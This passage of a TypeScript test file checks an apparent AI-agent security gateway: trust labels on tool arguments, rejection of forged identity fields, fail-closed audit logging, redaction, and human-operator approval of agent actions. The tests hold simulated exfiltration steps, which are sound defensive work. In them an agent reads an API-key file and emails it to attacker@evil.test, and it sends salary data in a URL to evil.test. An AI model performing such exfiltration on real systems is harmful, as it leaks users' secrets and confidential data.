import { existsSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { createStores } from "../src/audit/store.js";
import { openDatabase } from "../src/db/sqlite.js";
import { decideApproval } from "../src/gateway/approvals.js";
import { failingStores, memoryStores, start } from "./gateway-harness.js";
import { tempRuntime } from "./tool-harness.js";

const rt = tempRuntime();
afterAll(rt.cleanup);

const PRICING = { url: { value: "https://vendor.contoso.test/pricing" } };
const emailToMe = (body: string) => ({ tool: "send_email", args: { to: { ref: "user.email" }, subject: { value: "Q3 summary" }, body: { value: body } } });

describe("trust boundary: the gateway is the provenance and identity authority", () => {
  it("rejects requests that carry identity fields, and audits the rejection under the real identity", () => {
    const g = start("on", rt.dir);
    for (const forged of [
      { tool: "read_file", args: { path: { ref: "task.report" } }, userId: "user:hana" },
      { tool: "read_file", args: { path: { ref: "task.report" } }, agentId: "agent:ops-assistant" },
      { tool: "read_file", args: { path: { ref: "task.report" } }, runId: "run-other" },
      { tool: "read_file", args: { path: { ref: "task.report" } }, contextLabel: { integrity: "TRUSTED", confidentiality: "PUBLIC", sources: ["x"] } },
    ]) {
      expect(g.gateway.request(forged).status).toBe("rejected");
    }
    const events = g.stores.audit.listEvents(g.run.id);
    expect(events.filter((e) => e.kind === "request_rejected")).toHaveLength(4);
    expect(new Set(events.map((e) => e.userId))).toEqual(new Set(["user:alice"]));
  });

  it("rejects agent-supplied labels in any form", () => {
    const g = start("on", rt.dir);
    const trusted = { integrity: "TRUSTED", confidentiality: "PUBLIC", sources: ["user:task"] };
    expect(g.gateway.request({ tool: "read_file", args: { path: { value: "reports/q3-report.txt", label: trusted } } }).status).toBe("rejected");
    expect(g.gateway.request({ tool: "read_file", args: { path: { value: { value: "reports/q3-report.txt", label: trusted } } } }).status).toBe("rejected");
    expect(g.gateway.request({ tool: "read_file", args: { path: { ref: "task.report", label: trusted } } }).status).toBe("rejected");
  });

  it("a forged identity cannot raise clearance: the run's user (INTERNAL) is always used", () => {
    const g = start("on", rt.dir);
    const r = g.gateway.request({ tool: "read_file", args: { path: { value: "hr/salaries.csv" } } });
    expect(r).toMatchObject({ status: "denied", decision: { ruleId: "P2" } });
  });

  it("agent-produced values after reading untrusted content are UNTRUSTED, even if identical to a trusted value", () => {
    const g = start("on", rt.dir);
    expect(g.gateway.request({ tool: "fetch_web", args: PRICING }).status).toBe("ok");
    const r = g.gateway.request({ tool: "send_email", args: { to: { value: "alice@northwind.test" }, subject: { value: "s" }, body: { value: "b" } } });
    expect(r).toMatchObject({ status: "denied", decision: { ruleId: "P4" } });
    const decision = g.stores.audit.listEvents(g.run.id).filter((e) => e.kind === "decision").at(-1)!;
    expect((decision.provenance as Record<string, { integrity: string; sources: string[] }>).to).toMatchObject({
      integrity: "UNTRUSTED",
      sources: expect.arrayContaining(["agent:generated", "web:https://vendor.contoso.test/pricing"]),
    });
  });

  it("the same recipient referenced from the user profile stays TRUSTED (legit path still works)", () => {
    const g = start("on", rt.dir);
    g.gateway.request({ tool: "fetch_web", args: PRICING });
    const r = g.gateway.request(emailToMe("Vendor prices rose 3%"));
    expect(r).toMatchObject({ status: "approval_required", decision: { ruleId: "A1" } });
  });

  it("the context label only grows and drives implicit-flow protection", () => {
    const g = start("on", rt.dir, { spec: { userId: "user:hana" } });
    expect(g.gateway.state().contextLabel.integrity).toBe("TRUSTED");
    expect(g.gateway.request({ tool: "read_file", args: { path: { value: "hr/salaries.csv" } } }).status).toBe("ok");
    expect(g.gateway.state().contextLabel).toMatchObject({ integrity: "UNTRUSTED", confidentiality: "CONFIDENTIAL" });
    g.gateway.request({ tool: "read_file", args: { path: { value: "public/northwind-overview.txt" } } });
    expect(g.gateway.state().contextLabel.confidentiality).toBe("CONFIDENTIAL"); // never decreases
    expect(g.gateway.request(emailToMe("all good"))).toMatchObject({ status: "denied", decision: { ruleId: "P3" } });
  });

  it("refs expose plain values only (no labels) and unknown refs are rejected", () => {
    const g = start("on", rt.dir);
    g.gateway.request({ tool: "read_inbox", args: {} });
    const out = g.gateway.refs().find((r) => r.ref === "out-1")!;
    expect(JSON.stringify(out.value)).not.toMatch(/integrity|confidentiality/);
    expect(g.gateway.request({ tool: "read_file", args: { path: { ref: "out-99" } } }).status).toBe("rejected");
  });

  it("referencing a structured output where a string is required fails closed", () => {
    const g = start("on", rt.dir);
    g.gateway.request({ tool: "read_inbox", args: {} });
    expect(g.gateway.request({ tool: "read_file", args: { path: { ref: "out-1" } } })).toMatchObject({ status: "denied", decision: { ruleId: "F0" } });
  });
});

describe("audit: fail-closed and ordered", () => {
  it("records decision before execution and outcome after, with identity and policy version", () => {
    const g = start("on", rt.dir);
    expect(g.gateway.request({ tool: "read_file", args: { path: { ref: "task.report" } } }).status).toBe("ok");
    const [started, decision, outcome] = g.stores.audit.listEvents(g.run.id);
    expect([started!.kind, decision!.kind, outcome!.kind]).toEqual(["run_started", "decision", "outcome"]);
    expect(decision).toMatchObject({ userId: "user:alice", agentId: "agent:research-assistant", tool: "read_file", decision: "ALLOW", ruleId: "L1", policyId: "agentshield-enforce@1.1.0" });
    expect(decision!.callHash).toMatch(/^[0-9a-f]{64}$/);
    expect(outcome).toMatchObject({ outcome: "executed", callHash: decision!.callHash });
    expect(decision!.seq).toBeLessThan(outcome!.seq);
  });

  it("the decision row exists before the tool's side effect happens", () => {
    const { stores } = memoryStores();
    let outboxAtDecision: string[] | null = null;
    let outboxDir = "";
    const spy = {
      ...stores,
      audit: {
        ...stores.audit,
        append(e: Parameters<typeof stores.audit.append>[0], now: number) {
          if (e.kind === "decision" && e.tool === "send_email") outboxAtDecision = readdirSync(outboxDir);
          return stores.audit.append(e, now);
        },
      },
    };
    const g = start("off", rt.dir, { stores: spy });
    outboxDir = g.sandbox.outbox;
    expect(g.gateway.request(emailToMe("hello")).status).toBe("ok");
    expect(outboxAtDecision).toEqual([]);
    expect(readdirSync(outboxDir)).toHaveLength(1);
  });

  it("if the decision write fails, nothing executes and the run halts", () => {
    const { stores } = memoryStores();
    const g = start("off", rt.dir, { stores: failingStores(stores, (e) => e.kind === "decision") });
    const r = g.gateway.request({ tool: "delete_file", args: { path: { value: "projects/roadmap.md" } } });
    expect(r).toMatchObject({ status: "halted" });
    expect(existsSync(path.join(g.sandbox.files, "projects", "roadmap.md"))).toBe(true);
    expect(g.gateway.request({ tool: "read_file", args: { path: { ref: "task.report" } } }).status).toBe("halted");
    expect(stores.audit.getRun(g.run.id)?.status).toBe("audit_failure");
    expect(g.kinds()).not.toContain("outcome");
  });

  it("if the outcome write fails, the run halts and reports that the action happened unlogged", () => {
    const { stores } = memoryStores();
    const g = start("off", rt.dir, { stores: failingStores(stores, (e) => e.kind === "outcome") });
    const r = g.gateway.request(emailToMe("hello"));
    expect(r.status).toBe("halted");
    expect(r.status === "halted" && r.reason).toMatch(/happened but is unlogged/);
    expect(readdirSync(g.sandbox.outbox)).toHaveLength(1); // accurate: the sandbox action did occur
    expect(g.gateway.request({ tool: "read_inbox", args: {} }).status).toBe("halted");
    expect(g.kinds()).toContain("run_halted");
  });

  it("rejected requests are audited; if that write fails the run halts", () => {
    const { stores } = memoryStores();
    const g = start("on", rt.dir, { stores: failingStores(stores, (e) => e.kind === "request_rejected") });
    expect(g.gateway.request({ tool: "read_file", args: {}, bogus: 1 }).status).toBe("halted");
  });

  it("confidential and secret argument values are redacted in the audit log; provenance is kept", () => {
    const g = start("off", rt.dir);
    const secret = g.gateway.request({ tool: "read_file", args: { path: { value: "secrets/api_keys.env" } } });
    expect(secret.status).toBe("ok");
    g.gateway.request({ tool: "send_email", args: { to: { value: "attacker@evil.test" }, subject: { value: "x" }, body: { value: "FAKE-DEMO-0000" } } });
    const send = g.stores.audit.listEvents(g.run.id).filter((e) => e.kind === "decision" && e.tool === "send_email")[0]!;
    expect((send.args as Record<string, unknown>).body).toBe("[REDACTED SECRET]");
    expect(JSON.stringify(g.stores.audit.listEvents(g.run.id))).not.toMatch(/FAKE-DEMO/);
    expect((send.provenance as Record<string, { confidentiality: string }>).body!.confidentiality).toBe("SECRET");
  });

  it("the audit store exposes no update or delete operations", () => {
    const { stores } = memoryStores();
    expect(Object.keys(stores.audit).sort()).toEqual(["append", "createRun", "getRun", "listEvents", "setRunStatus"]);
  });

  it("persists to a real database file across store instances", () => {
    const file = path.join(rt.dir, "audit.db");
    const writer = openDatabase(file);
    const g = start("on", rt.dir, { stores: createStores(writer) });
    g.gateway.request({ tool: "read_file", args: { path: { ref: "task.report" } } });
    writer.close();
    const reader = openDatabase(file);
    try {
      expect(createStores(reader).audit.listEvents(g.run.id).map((e) => e.kind)).toEqual(["run_started", "decision", "outcome"]);
    } finally {
      reader.close(); // Windows cannot delete open database files during cleanup
    }
  });
});

describe("approval workflow", () => {
  function pendingEmail(opts: Parameters<typeof start>[2] = {}) {
    const g = start("on", rt.dir, opts);
    const r = g.gateway.request(emailToMe("Revenue grew 12%."));
    if (r.status !== "approval_required") throw new Error(`expected approval_required, got ${r.status}`);
    return { ...g, approvalId: r.approvalId };
  }

  it("full flow: request -> pending -> operator approves -> PEP re-evaluates -> executes once", () => {
    const g = pendingEmail();
    expect(readdirSync(g.sandbox.outbox)).toEqual([]);
    expect(g.gateway.resume(g.approvalId)).toEqual({ status: "approval_pending", approvalId: g.approvalId });
    expect(decideApproval(g.stores, g.approvalId, "operator:alice", "approve", Date.now()).ok).toBe(true);
    const r = g.gateway.resume(g.approvalId);
    expect(r).toMatchObject({ status: "ok", decision: { decision: "ALLOW", ruleId: "A2+APPROVED" } });
    expect(readdirSync(g.sandbox.outbox)).toHaveLength(1);
    expect(g.kinds()).toEqual(["run_started", "decision", "approval_requested", "approval_decided", "re_decision", "outcome"]);
    expect(g.stores.approvals.get(g.approvalId)).toMatchObject({ used: true, approverId: "operator:alice" });
  });

  it("replay: an approval executes at most once", () => {
    const g = pendingEmail();
    decideApproval(g.stores, g.approvalId, "operator:alice", "approve", Date.now());
    expect(g.gateway.resume(g.approvalId).status).toBe("ok");
    expect(g.gateway.resume(g.approvalId).status).toBe("rejected");
    expect(g.kinds().at(-1)).toBe("request_rejected"); // the replay attempt is audited
    expect(g.stores.approvals.consume(g.approvalId, g.stores.approvals.get(g.approvalId)!.callHash, Date.now())).toBe(false);
    expect(readdirSync(g.sandbox.outbox)).toHaveLength(1);
  });

  it("well-formed but unknown approval ids are rejected and audited without exposing call data", () => {
    const g = start("on", rt.dir);
    const unknownId = "appr-00000000-0000-4000-8000-000000000000";
    expect(g.gateway.resume(unknownId)).toEqual({ status: "rejected", reason: "No pending call for this approval in this run" });
    const last = g.stores.audit.listEvents(g.run.id).at(-1)!;
    expect(last).toMatchObject({ kind: "request_rejected", approvalId: unknownId, detail: { reason: "No pending call for this approval in this run" } });
    expect(last.args ?? null).toBeNull();
    expect(g.gateway.state().halted).toBeNull(); // null = not halted
  });

  it("audit distinguishes a malformed id (approvalId NULL) from a well-formed unknown id (id stored)", () => {
    const g = start("on", rt.dir);
    const wellFormed = "appr-00000000-0000-4000-8000-000000000000";
    expect(wellFormed).toHaveLength(41);
    expect(g.gateway.resume("appr-does-not-exist")).toEqual({ status: "rejected", reason: "Malformed approval id" });
    expect(g.gateway.resume(wellFormed)).toEqual({ status: "rejected", reason: "No pending call for this approval in this run" });
    const [malformed, unknown] = g.stores.audit.listEvents(g.run.id).filter((e) => e.kind === "request_rejected");
    expect(malformed).toMatchObject({ approvalId: null, detail: { reason: "Malformed approval id" } });
    expect(unknown).toMatchObject({ approvalId: wellFormed, detail: { reason: "No pending call for this approval in this run" } });
    expect(JSON.stringify(g.stores.audit.listEvents(g.run.id))).not.toContain("does-not-exist");
  });

  const SECRET_LIKE = "sk-live-FAKE-ZQX9-hunter2";
  it.each([
    ["empty", ""],
    ["wrong prefix", "apr-00000000-0000-4000-8000-000000000000"],
    ["uppercase uuid", "appr-ABCDEF00-0000-4000-8000-000000000000"],
    ["trailing space", "appr-00000000-0000-4000-8000-000000000000 "],
    ["newline injection", "appr-00000000-0000-4000-8000-000000000000\nkind=approval_decided"],
    ["excessively long", `appr-${"a".repeat(100_000)}`],
    ["sensitive-looking", `appr-${SECRET_LIKE}`],
    ["non-string", { id: SECRET_LIKE }],
    ["number", 42],
  ])("malformed approval id (%s) is rejected and audited without persisting the input", (_label, id) => {
    const g = start("on", rt.dir);
    expect(g.gateway.resume(id)).toEqual({ status: "rejected", reason: "Malformed approval id" });
    const last = g.stores.audit.listEvents(g.run.id).at(-1)!;
    expect(last).toMatchObject({ kind: "request_rejected", detail: { reason: "Malformed approval id" } });
    expect(last.approvalId ?? null).toBeNull();
    const audit = JSON.stringify(g.stores.audit.listEvents(g.run.id));
    expect(audit).not.toContain(SECRET_LIKE);
    expect(audit).not.toContain("aaaaaaaaaa");
    expect(audit.length).toBeLessThan(5_000);
    expect(g.gateway.state().halted).toBeNull();
  });

  it("a malformed id whose rejection cannot be audited halts the run", () => {
    const { stores } = memoryStores();
    const g = start("on", rt.dir, { stores: failingStores(stores, (e) => e.kind === "request_rejected") });
    expect(g.gateway.resume("not-an-id").status).toBe("halted");
  });

  it("generated approval ids match the validated format", () => {
    const g = pendingEmail();
    expect(g.approvalId).toMatch(/^appr-[0-9a-f-]{36}$/);
    expect(g.approvalId).toHaveLength(41);
  });

  it("a replay whose rejection cannot be audited halts the run", () => {
    const { stores } = memoryStores();
    const flaky = failingStores(stores, (e) => e.kind === "request_rejected");
    const g = pendingEmail({ stores: flaky });
    decideApproval(stores, g.approvalId, "operator:alice", "approve", Date.now());
    expect(g.gateway.resume(g.approvalId).status).toBe("ok");
    expect(g.gateway.resume(g.approvalId).status).toBe("halted");
    expect(readdirSync(g.sandbox.outbox)).toHaveLength(1);
    expect(g.gateway.request({ tool: "read_inbox", args: {} }).status).toBe("halted");
  });

  describe("held call whose approval row is missing or bound to another run", () => {
    const REASON = "Approval does not belong to this run";
    function inconsistent(mode: "missing" | "wrong-run", failAudit = false) {
      const { stores } = memoryStores();
      let corrupt = false;
      const tampered = {
        ...stores,
        approvals: {
          ...stores.approvals,
          get: (id: string) => {
            const r = stores.approvals.get(id);
            if (!corrupt || !r) return r;
            return mode === "missing" ? null : { ...r, runId: "run-00000000-0000-4000-8000-000000000000" };
          },
        },
      };
      const used = failAudit ? failingStores(tampered, (e) => e.kind === "request_rejected") : tampered;
      const g = start("on", rt.dir, { stores: used });
      const r = g.gateway.request(emailToMe("Revenue grew 12%."));
      if (r.status !== "approval_required") throw new Error(r.status);
      decideApproval(stores, r.approvalId, "operator:alice", "approve", Date.now());
      corrupt = true;
      return { g, stores, approvalId: r.approvalId };
    }

    it.each(["missing", "wrong-run"] as const)("%s: rejected, audited with a fixed reason, nothing executes, not reusable", (mode) => {
      const { g, stores, approvalId } = inconsistent(mode);
      expect(g.gateway.resume(approvalId)).toEqual({ status: "rejected", reason: REASON });
      const last = stores.audit.listEvents(g.run.id).at(-1)!;
      expect(last).toMatchObject({ kind: "request_rejected", approvalId, detail: { reason: REASON }, args: null, provenance: null, reasons: null });
      expect(JSON.stringify(last)).not.toContain("Revenue");
      expect(readdirSync(g.sandbox.outbox)).toEqual([]);
      expect(stores.approvals.get(approvalId)?.used).toBe(false); // never consumed
      // The held call was dropped: a retry cannot reach re-evaluation.
      expect(g.gateway.resume(approvalId)).toEqual({ status: "rejected", reason: "No pending call for this approval in this run" });
      expect(readdirSync(g.sandbox.outbox)).toEqual([]);
      expect(g.gateway.state().halted).toBeNull();
    });

    it.each(["missing", "wrong-run"] as const)("%s: if the rejection cannot be audited, the run halts", (mode) => {
      const { g, approvalId } = inconsistent(mode, true);
      expect(g.gateway.resume(approvalId).status).toBe("halted");
      expect(readdirSync(g.sandbox.outbox)).toEqual([]);
      expect(g.gateway.request({ tool: "read_inbox", args: {} }).status).toBe("halted");
    });
  });

  it("an approval cannot be used by another run's gateway", () => {
    const { stores } = memoryStores();
    const a = pendingEmail({ stores });
    const b = start("on", rt.dir, { stores });
    decideApproval(stores, a.approvalId, "operator:alice", "approve", Date.now());
    expect(b.gateway.resume(a.approvalId).status).toBe("rejected");
  });

  it("rejected approvals are denied on re-evaluation", () => {
    const g = pendingEmail();
    decideApproval(g.stores, g.approvalId, "operator:alice", "reject", Date.now());
    expect(g.gateway.resume(g.approvalId)).toMatchObject({ status: "denied", decision: { ruleId: "F0" } });
    expect(readdirSync(g.sandbox.outbox)).toEqual([]);
  });

  it("expired approvals cannot be decided or used", () => {
    let now = 1_900_000_000_000;
    const g = pendingEmail({ clock: () => now });
    now += 301_000;
    expect(decideApproval(g.stores, g.approvalId, "operator:alice", "approve", now)).toMatchObject({ ok: false, code: "EXPIRED" });
    expect(g.gateway.resume(g.approvalId)).toMatchObject({ status: "denied", decision: { ruleId: "F0" } });
  });

  it("approved but expired before use is denied", () => {
    let now = 1_900_000_000_000;
    const g = pendingEmail({ clock: () => now });
    decideApproval(g.stores, g.approvalId, "operator:alice", "approve", now);
    now += 301_000;
    const r = g.gateway.resume(g.approvalId);
    expect(r).toMatchObject({ status: "denied", decision: { ruleId: "F0" } });
    expect(r.status === "denied" && r.decision.reasons.join(" ")).toMatch(/expired/);
  });

  it.each(["agent:research-assistant", "agent:ops-assistant", "user:alice", "operator:mallory", "operator:alice "])(
    "only registered human operators may decide (%j is refused)",
    (approver) => {
      const g = pendingEmail();
      expect(decideApproval(g.stores, g.approvalId, approver, "approve", Date.now())).toMatchObject({ ok: false, code: "FORBIDDEN" });
      expect(g.stores.approvals.get(g.approvalId)?.status).toBe("pending");
    },
  );

  it("an approval can only be decided once", () => {
    const g = pendingEmail();
    expect(decideApproval(g.stores, g.approvalId, "operator:alice", "reject", Date.now()).ok).toBe(true);
    expect(decideApproval(g.stores, g.approvalId, "operator:alice", "approve", Date.now())).toMatchObject({ ok: false, code: "CONFLICT" });
  });

  it("call-binding mismatch: a tampered approval hash is denied on re-evaluation and nothing executes", () => {
    const { db, stores } = memoryStores();
    const g = pendingEmail({ stores });
    decideApproval(stores, g.approvalId, "operator:alice", "approve", Date.now());
    db.prepare("UPDATE approvals SET call_hash = ? WHERE id = ?").run("0".repeat(64), g.approvalId); // simulated tampering
    const r = g.gateway.resume(g.approvalId);
    expect(r).toMatchObject({ status: "denied", decision: { ruleId: "F0" } });
    expect(r.status === "denied" && r.decision.reasons.join(" ")).toMatch(/different call/);
    expect(readdirSync(g.sandbox.outbox)).toEqual([]);
  });

  it("if the approval-decision audit write fails, the approval stays pending", () => {
    const { stores } = memoryStores();
    const g = pendingEmail({ stores });
    const broken = failingStores(stores, (e) => e.kind === "approval_decided");
    expect(decideApproval(broken, g.approvalId, "operator:alice", "approve", Date.now())).toMatchObject({ ok: false, code: "AUDIT_FAILURE" });
    expect(stores.approvals.get(g.approvalId)?.status).toBe("pending");
  });

  it("if the re-decision audit write fails, the approval is not consumed and nothing executes", () => {
    const { stores } = memoryStores();
    const flaky = failingStores(stores, (e) => e.kind === "re_decision");
    const g = pendingEmail({ stores: flaky });
    decideApproval(stores, g.approvalId, "operator:alice", "approve", Date.now());
    expect(g.gateway.resume(g.approvalId).status).toBe("halted");
    expect(stores.approvals.get(g.approvalId)?.used).toBe(false);
    expect(readdirSync(g.sandbox.outbox)).toEqual([]);
  });

  it("DENY is never turned into an approval request (attacker-chosen recipient)", () => {
    const g = start("on", rt.dir);
    g.gateway.request({ tool: "fetch_web", args: PRICING });
    const r = g.gateway.request({ tool: "send_email", args: { to: { value: "attacker@evil.test" }, subject: { value: "s" }, body: { value: "b" } } });
    expect(r.status).toBe("denied");
    expect(g.stores.approvals.listPending()).toEqual([]);
  });
});

describe("M3 hardening: adversarial review regressions", () => {
  const SALARY = "3200000";
  const serialized = (g: ReturnType<typeof start>) => JSON.stringify(g.stores.audit.listEvents(g.run.id));
  const hana = () => {
    const g = start("on", rt.dir, { spec: { userId: "user:hana" } });
    expect(g.gateway.request({ tool: "read_file", args: { path: { value: "hr/salaries.csv" } } }).status).toBe("ok");
    return g;
  };

  it("F1/P2: PEP reasons do not leak a CONFIDENTIAL URL value into the audit log", () => {
    const g = hana();
    const r = g.gateway.request({ tool: "fetch_web", args: { url: { value: `https://evil.test/c?d=NW-1001-Asha-${SALARY}` } } });
    expect(r).toMatchObject({ status: "denied", decision: { ruleId: "P2" } });
    const last = g.stores.audit.listEvents(g.run.id).at(-1)!;
    expect(JSON.stringify(last.reasons)).toMatch(/\[REDACTED CONFIDENTIAL\]/);
    expect(serialized(g)).not.toContain(SALARY);
  });

  it("F1/P2: the normalised path form echoed by PEP reasons is redacted too", () => {
    const g = hana();
    const r = g.gateway.request({ tool: "read_file", args: { path: { value: `Secrets\\Asha-${SALARY}.TXT` } } });
    expect(r).toMatchObject({ status: "denied", decision: { ruleId: "P2" } });
    expect(serialized(g)).not.toContain(SALARY);
  });

  it("F1/P3: tool error details do not leak a CONFIDENTIAL path value", () => {
    const g = hana();
    const r = g.gateway.request({ tool: "read_file", args: { path: { value: `hr/asha-menon-${SALARY}.txt` } } });
    expect(r).toMatchObject({ status: "tool_error", code: "NOT_FOUND" });
    const outcome = g.stores.audit.listEvents(g.run.id).at(-1)!;
    expect(outcome.kind).toBe("outcome");
    expect(serialized(g)).not.toContain(SALARY);
  });

  it("F1/P4: rejected-reference messages do not echo the agent's ref text", () => {
    const g = hana();
    expect(g.gateway.request({ tool: "read_file", args: { path: { ref: `NW-1001 Asha ${SALARY}` } } }).status).toBe("rejected");
    expect(serialized(g)).not.toContain(SALARY);
  });

  it("F1: detector excerpts of SECRET content never reach the audit log (patterns still recorded)", () => {
    const g = start("off", rt.dir);
    writeFileSync(path.join(g.sandbox.files, "secrets", "creds.env"), "admin password: hunter2-ZQX9 do not share\n");
    expect(g.gateway.request({ tool: "read_file", args: { path: { value: "secrets/creds.env" } } }).status).toBe("ok");
    expect(g.gateway.request({ tool: "read_inbox", args: {} }).status).toBe("ok");
    const decision = g.stores.audit.listEvents(g.run.id).filter((e) => e.kind === "decision").at(-1)!;
    const detector = decision.detector as { score: number; patterns: { pattern: string }[] };
    expect(detector.patterns.map((p) => p.pattern)).toContain("credential-target"); // the detector did see it
    expect(JSON.stringify(detector)).not.toMatch(/excerpt/);
    expect(serialized(g)).not.toContain("hunter2");
  });

  it("final review: an unknown tool name chosen by the agent is not stored verbatim in the audit log", () => {
    const g = hana();
    const smuggled = `nw_1001_asha_${SALARY}`;
    expect(g.gateway.request({ tool: smuggled, args: {} })).toMatchObject({ status: "denied", decision: { ruleId: "F0" } });
    const last = g.stores.audit.listEvents(g.run.id).at(-1)!;
    expect(last).toMatchObject({ kind: "decision", tool: "[unknown tool]" });
    expect(serialized(g)).not.toContain(SALARY);
  });

  it("final review: unexpected argument names are not stored verbatim in the audit log", () => {
    const g = hana();
    const smuggled = `asha_${SALARY}`;
    const r = g.gateway.request({ tool: "read_file", args: { path: { value: "reports/q3-report.txt" }, [smuggled]: { value: "x" } } });
    expect(r).toMatchObject({ status: "denied", decision: { ruleId: "F0" } });
    const last = g.stores.audit.listEvents(g.run.id).at(-1)!;
    expect(Object.keys(last.args as object).sort()).toEqual(["[unexpected argument 1]", "path"]);
    expect(serialized(g)).not.toContain(SALARY);
  });

  it("final review: known tool and argument names are still recorded verbatim", () => {
    const g = start("on", rt.dir);
    g.gateway.request({ tool: "read_file", args: { path: { ref: "task.report" } } });
    const decision = g.stores.audit.listEvents(g.run.id).find((e) => e.kind === "decision")!;
    expect(decision).toMatchObject({ tool: "read_file", args: { path: "reports/q3-report.txt" } });
  });

  it("F4: approval re-evaluation uses the current run context (confidential read after the request => P3 DENY)", () => {
    const g = start("on", rt.dir, { spec: { userId: "user:hana" } });
    const r = g.gateway.request(emailToMe("status update"));
    if (r.status !== "approval_required") throw new Error(r.status);
    expect(g.gateway.request({ tool: "read_file", args: { path: { value: "hr/salaries.csv" } } }).status).toBe("ok");
    decideApproval(g.stores, r.approvalId, "operator:alice", "approve", Date.now());
    expect(g.gateway.resume(r.approvalId)).toMatchObject({ status: "denied", decision: { ruleId: "P3" } });
    expect(readdirSync(g.sandbox.outbox)).toEqual([]);
    expect(g.stores.approvals.get(r.approvalId)?.used).toBe(false);
  });

  it("F4: the context join keeps the stored call's hash binding (approval still valid; rule reflects the new taint)", () => {
    const g = start("on", rt.dir);
    const r = g.gateway.request(emailToMe("hello"));
    if (r.status !== "approval_required") throw new Error(r.status);
    expect(r.decision.ruleId).toBe("A2");
    g.gateway.request({ tool: "read_file", args: { path: { ref: "task.report" } } }); // context becomes UNTRUSTED, still INTERNAL
    expect(g.gateway.state().contextLabel.integrity).toBe("UNTRUSTED");
    const originalHash = g.stores.approvals.get(r.approvalId)!.callHash;
    expect(decideApproval(g.stores, r.approvalId, "operator:alice", "approve", Date.now()).ok).toBe(true);

    // Exactly one resume: same call hash => approval consumed; current (tainted) context => A1 instead of A2.
    expect(g.gateway.resume(r.approvalId)).toMatchObject({ status: "ok", decision: { decision: "ALLOW", ruleId: "A1+APPROVED" } });
    expect(g.stores.approvals.get(r.approvalId)).toMatchObject({ used: true, callHash: originalHash });

    // Replay: the single-use approval cannot execute again.
    expect(g.gateway.resume(r.approvalId).status).toBe("rejected");
    expect(g.stores.approvals.consume(r.approvalId, originalHash, Date.now())).toBe(false);
    expect(readdirSync(g.sandbox.outbox)).toHaveLength(1);

    const events = g.stores.audit.listEvents(g.run.id).filter((e) => e.approvalId === r.approvalId || e.callHash === originalHash);
    expect(events.map((e) => [e.kind, e.ruleId ?? null, e.outcome ?? null])).toEqual([
      ["decision", "A2", null],
      ["approval_requested", null, null],
      ["approval_decided", null, null],
      ["re_decision", "A1+APPROVED", null],
      ["outcome", null, "executed"],
      ["request_rejected", null, null],
    ]);
    // The context change did not alter the binding: every hash-bearing row carries the original call hash.
    expect(new Set(events.filter((e) => e.callHash).map((e) => e.callHash))).toEqual(new Set([originalHash]));
  });

  it("F5: an approval that expires while pending is reported as expired", () => {
    let now = 1_900_000_000_000;
    const g = start("on", rt.dir, { clock: () => now });
    const r = g.gateway.request(emailToMe("hi"));
    if (r.status !== "approval_required") throw new Error(r.status);
    now += 301_000;
    const res = g.gateway.resume(r.approvalId);
    expect(res).toMatchObject({ status: "denied", decision: { ruleId: "F0", reasons: ["F0: approval expired before an operator decided"] } });
    expect(g.stores.audit.listEvents(g.run.id).at(-1)!.reasons).toEqual(["F0: approval expired before an operator decided"]);
  });

  it("F5: a failed re-decision audit write is reported as an audit failure, approval unconsumed", () => {
    const { stores } = memoryStores();
    const g = start("on", rt.dir, { stores: failingStores(stores, (e) => e.kind === "re_decision") });
    const r = g.gateway.request(emailToMe("hi"));
    if (r.status !== "approval_required") throw new Error(r.status);
    decideApproval(stores, r.approvalId, "operator:alice", "approve", Date.now());
    const res = g.gateway.resume(r.approvalId);
    expect(res.status).toBe("halted");
    expect(res.status === "halted" && res.reason).toMatch(/approval not consumed, nothing executed/);
    expect(stores.approvals.get(r.approvalId)?.used).toBe(false);
  });

  it("F5: a consumption failure is reported as such, rolled back and audited", () => {
    const { stores } = memoryStores();
    const noConsume = { ...stores, approvals: { ...stores.approvals, consume: () => false } };
    const g = start("on", rt.dir, { stores: noConsume });
    const r = g.gateway.request(emailToMe("hi"));
    if (r.status !== "approval_required") throw new Error(r.status);
    decideApproval(stores, r.approvalId, "operator:alice", "approve", Date.now());
    expect(g.gateway.resume(r.approvalId)).toMatchObject({ status: "denied", decision: { ruleId: "F0", reasons: [expect.stringMatching(/could not be consumed/)] } });
    const reDecisions = stores.audit.listEvents(g.run.id).filter((e) => e.kind === "re_decision");
    expect(reDecisions.map((e) => e.decision)).toEqual(["DENY"]); // the ALLOW re-decision was rolled back
    expect(readdirSync(g.sandbox.outbox)).toEqual([]);
  });

  it("F6: a database error in resume() halts the run instead of escaping", () => {
    const { stores } = memoryStores();
    let broken = false;
    const flaky = {
      ...stores,
      approvals: {
        ...stores.approvals,
        get: (id: string) => {
          if (broken) throw new Error("SQLITE_IOERR");
          return stores.approvals.get(id);
        },
      },
    };
    const g = start("on", rt.dir, { stores: flaky });
    const r = g.gateway.request(emailToMe("hi"));
    if (r.status !== "approval_required") throw new Error(r.status);
    decideApproval(stores, r.approvalId, "operator:alice", "approve", Date.now());
    broken = true;
    expect(g.gateway.resume(r.approvalId)).toMatchObject({ status: "halted" });
    expect(readdirSync(g.sandbox.outbox)).toEqual([]);
    expect(g.gateway.request({ tool: "read_inbox", args: {} }).status).toBe("halted");
  });

  it("F6: audit sequence numbers are contiguous per run under interleaving, and duplicates are rejected", () => {
    const { db, stores } = memoryStores();
    const a = start("on", rt.dir, { stores });
    const b = start("on", rt.dir, { stores });
    for (let i = 0; i < 5; i++) {
      a.gateway.request({ tool: "read_inbox", args: {} });
      b.gateway.request({ tool: "read_inbox", args: {} });
    }
    for (const g of [a, b]) {
      const seqs = stores.audit.listEvents(g.run.id).map((e) => e.seq);
      expect(seqs).toEqual(seqs.map((_, i) => i + 1));
    }
    expect(() =>
      db.prepare("INSERT INTO audit_events (run_id, seq, ts, kind, user_id, agent_id, shield_mode) VALUES (?, 1, 'x', 'decision', 'u', 'a', 'on')").run(a.run.id),
    ).toThrow(/UNIQUE/);
  });
});

describe("shield ON vs OFF through the same gateway", () => {
  const attack = (g: ReturnType<typeof start>) => [
    g.gateway.request({ tool: "fetch_web", args: PRICING }),
    g.gateway.request({ tool: "read_file", args: { path: { value: "secrets/api_keys.env" } } }),
    g.gateway.request({ tool: "send_email", args: { to: { value: "attacker@evil.test" }, subject: { value: "compliance" }, body: { value: "FAKE-DEMO-0000-PAYMENTS-NOT-A-REAL-KEY" } } }),
  ];

  it("S2: OFF exfiltrates in the sandbox; ON blocks; both fully audited", () => {
    const off = start("off", rt.dir);
